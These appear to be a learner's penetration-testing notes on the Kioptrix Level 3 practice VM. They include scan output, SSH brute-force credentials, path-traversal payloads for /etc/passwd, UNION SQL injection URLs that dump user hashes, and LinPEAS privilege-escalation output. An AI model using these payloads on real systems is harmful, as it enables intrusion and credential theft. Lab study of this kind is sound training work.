OS: Ubuntu

Web Technology: 
LiGoat Security
LotusCMS
phpMyAdmin 2.11.3



IP: 192.168.1.120

USERS:
loneferret

CREDENTIALS:
loneferret:starwars

#####################################################
Community Attack Vectors (To-Try List):

22 → SSH → brute force user credentials → 

80 → HTTP → GoBuster [files/directories] → nikto → Manual Inspection → robots/.DS_STORE/svn/ → LFI in comment sections → FUZZ

#####################################################
NMAP RESULTS:

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)

80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-title: Ligoat Security - Got Goat? Security ...
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
MAC Address: 08:00:27:24:2A:41 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


#####################################################
Steps Taken():
[+] nmap -A -sV -sT -p- $IP 
[+] added kioptrix3.com to /etc/hosts
[+] Home page information
[+] Blog information
[+] username "loneferret" the “new lead” for the project
[+] Gobuster scan
[+] enumeration discovery “LotusCMS”
[+] exploit discovery lotusRCE.sh (vulnerability using eval() function)
[+] basic shell as www-data
[+] ssh bruteforcing username “loneferret”
[+] password hit “starwars”
[+]
[+]
[+]
[+]
[+]
[+]
[+]
[+]
[+]
[+]
[+]
[+]
[+]
[+]
[+]
[+]

#####################################################
Web Services Enumeration:  

[  +  NIKTO   ]

+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ Cookie PHPSESSID created without the httponly flag
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 15:22:00 2009
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.


[  +  WFUZZ  ]

FILES:   /   (Web Root)
/index.php            (Status: 200) [Size: 1819]
/favicon.ico          (Status: 200) [Size: 23126]
/update.php           (Status: 200) [Size: 18]   

DIRECTORIES:  /  (Web Root)
/cache                	(Status: 301) [Size: 353] [--> http://192.168.1.120/cache/]
/modules              	(Status: 301) [Size: 355] [--> http://192.168.1.120/modules/]
/data                 	(Status: 403) [Size: 324]                                    
/gallery              	(Status: 301) [Size: 355] [--> http://192.168.1.120/gallery/]
/phpmyadmin        (Status: 301) [Size: 358] [--> http://192.168.1.120/phpmyadmin/]
/server-status       	(Status: 403) [Size: 333]

Interesting:
http://192.168.1.120/modules/Blog/
http://192.168.1.120/modules/TinyMCE/tiny_mce/

Sorting options lend themselves to SQL UNION attacks
http://kioptrix3.com/gallery/gallery.php?id=1&sort=#photos


#####################################################
OTHER:  

"new gallery CMS" (custom)
"we've put this on our dev-servers"
hosted on the same server as the "FindUr Netbook Anywhere" code
If you want the source code, the price is schedualed to go for about 900$(USD)
Gallery is under GPLv2
Login powered by LotusCMS
http://kioptrix3.com/index.php?system=Blog&post=1281005380#comments
Comment Posting allows for SSRF?

# WFUZZ for LFI
/../../../../../../../../../../../etc/passwd%00.jpg
/../../../../../../../../../../../etc/passwd%00.html

Gallerific
[+] https://www.exploit-db.com/exploits/15891
[+] http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6,7,8+from+gallarific_users--
[+] http://kioptrix3.com/gallery/gallery.php??id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6,7,8+from+gallarific_users--
#We need to determine how many columns the UNION ALL SELECT statement needs to contain to properly execute.
[+] http://kioptrix3.com/gallery/gallery.php?id=null%20union%20all%20select%201,2,3,4,5,6--
[+] http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6+from+gallarific_users--
[+] http://kioptrix3.com/gallery/gallery.php?id=null%20union%20all%20select%201,user(),3,4,5,6--
[+] http://kioptrix3.com/gallery/gallery.php?id=null%20union%20all%20select%201,table_name,3,4,5,6%20FROM%20information_schema.tables--
[+] http://kioptrix3.com/gallery/gallery.php?id=null%20union%20all%20select%201,column_name,3,4,5,6%20FROM%20information_schema.columns%20where%20table_name=%27dev_accounts%27--
[+] http://kioptrix3.com/gallery/gallery.php?id=null%20union%20all%20select%201,concat(id,username,password),3,4,5,6%20FROM%20dev_accounts--
Hashes:
1dreg0d3eccfb887aabd50f243b3f155c0f85
2loneferret5badcaf789d3d1d09794d8f021f40f0e

LinPEASS
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                         
-rwsr-xr-x 1 root root 4.5K Aug 22  2008 /usr/lib/eject/dmcrypt-get-device                                          
-rwsr-xr-x 1 root root 165K May 14  2008 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root www-data 11K Jun 18  2009 /usr/lib/apache2/suexec
-rwsr-xr-x 1 root root 9.4K Jan 11  2011 /usr/lib/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)
-rwsr-xr-x 1 root root 11K Dec 10  2007 /usr/bin/arping
-rwsr-xr-x 1 root root 46K Mar 31  2008 /usr/bin/mtr
-rwsr-xr-x 1 root root 19K Dec  8  2008 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 28K Dec  8  2008 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 37K Dec  8  2008 /usr/bin/gpasswd
-rwsr-xr-x 2 root root 106K Feb 16  2009 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-sr-x 1 daemon daemon 38K Feb 20  2007 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 2 root root 106K Feb 16  2009 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerableedit
-rwsr-xr-x 1 root root 24K Dec  8  2008 /usr/bin/chsh
-rwsr-xr-x 1 root root 29K Dec  8  2008 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                  
-rwsr-xr-x 1 root root 13K Dec 10  2007 /usr/bin/traceroute6.iputils
-rwsr-sr-x 1 root root 2.0M Apr 16  2011 /usr/local/bin/ht (Unknown SUID binary)
-rwsr-xr-- 1 root dip 263K Oct  4  2007 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-sr-x 1 libuuid libuuid 13K Mar 27  2008 /usr/sbin/uuidd
-rwsr-xr-- 1 root dhcp 2.9K Apr  2  2008 /lib/dhcp3-client/call-dhclient-script (Unknown SUID binary)
-rwsr-xr-- 1 root fuse 20K Feb 26  2008 /bin/fusermount
-rwsr-xr-x 1 root root 31K Dec 10  2007 /bin/ping
-rwsr-xr-x 1 root root 80K Sep 26  2008 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                                 
-rwsr-xr-x 1 root root 63K Sep 26  2008 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 27K Dec 10  2007 /bin/ping6
-rwsr-xr-x 1 root root 25K Dec  8  2008 /bin/su

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                         
-rwxr-sr-x 1 root shadow 38K Dec  8  2008 /usr/bin/chage                                                            
-rwxr-sr-x 1 root tty 9.8K Sep 26  2008 /usr/bin/wall
-rwxr-sr-x 1 root mlocate 30K Mar  8  2008 /usr/bin/mlocate
-rwxr-sr-x 1 root crontab 27K May 12  2009 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 17K Dec  8  2008 /usr/bin/expiry
-rwsr-sr-x 1 daemon daemon 38K Feb 20  2007 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root tty 8.0K Dec 12  2007 /usr/bin/bsd-write
-rwxr-sr-x 1 root ssh 75K May 14  2008 /usr/bin/ssh-agent
-rwsr-sr-x 1 root root 2.0M Apr 16  2011 /usr/local/bin/ht (Unknown SGID binary)
-rwsr-sr-x 1 libuuid libuuid 13K Mar 27  2008 /usr/sbin/uuidd
-rwxr-sr-x 1 root shadow 20K May 16  2008 /sbin/unix_chkpwd

#####################################################
Take Away Concepts
• trust that one of the attack vectors you've found will work and continue cycling through each of them until something sticks
   ◇ explore other exploits outside of exploit-db
   ◇ sometimes the default exploits will not work
   ◇ check github
• Spend more than a few minute looking for exploits
• Whenever we see a webpage, particularly php-sites, which contain a variable declared by ? such as ?pg, and an argument passed to the variable denoted by = such as =foo there is a potential for a Local File Inclusion (LFI) vulnerability
• you will kick yourself if you had the right vector and simply did not “try harder” enough.
• use tools to FUZZ LFI vectors
   ◇ check for anomolies in the output if its not clear if there are any hits
• importance of not relying on any one tool
   ◇ may lead to a dead end
• Sorting options lend themselves to SQL UNION attacks
